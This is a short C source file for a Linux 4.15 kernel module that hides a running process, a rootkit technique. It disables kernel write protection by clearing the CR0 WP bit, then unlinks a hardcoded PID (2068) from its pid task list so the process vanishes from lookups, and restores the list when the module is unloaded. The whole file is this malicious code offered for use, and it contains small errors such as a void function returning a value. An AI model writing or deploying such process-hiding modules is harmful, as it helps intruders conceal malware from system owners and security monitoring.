#include "/usr/src/linux-4.15/include/linux/kernel.h"
#include "/usr/src/linux-4.15/include/linux/module.h"
#include "/usr/src/linux-4.15/include/linux/types.h"
#include "/usr/src/linux-4.15/include/linux/idr.h"
#include <asm/unistd.h>
#include <asm/current.h>
#include "/usr/src/linux-4.15/include/linux/list.h"
#include "/usr/src/linux-4.15/include/linux/sched.h"
#include "/usr/src/linux-4.15/include/linux/pid.h"
#define FIRST_PROCESS_ENTRY 256
#define PROC_NUMBUF 13
#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CHS");

void
set_addr_rw(void)
{ 
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
}


void
set_addr_ro(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
}
struct hlist_node *origin_first;
struct pid *hiden_pid;
int __init hack_kernel(void){
	pid_t pid = 2068;

	set_addr_rw();
	
	hiden_pid = find_vpid(pid);

	
	origin_first = hiden_pid->tasks[PIDTYPE_PID].first;
	hiden_pid->tasks[PIDTYPE_PID].first=NULL;
	
	set_addr_ro();


	return 0;
}


void __exit hack_kernel_exit(void){

	set_addr_rw();
	hiden_pid->tasks[PIDTYPE_PID].first=origin_first;
	set_addr_ro();
	return 0;
}
module_init(hack_kernel);
module_exit(hack_kernel_exit)
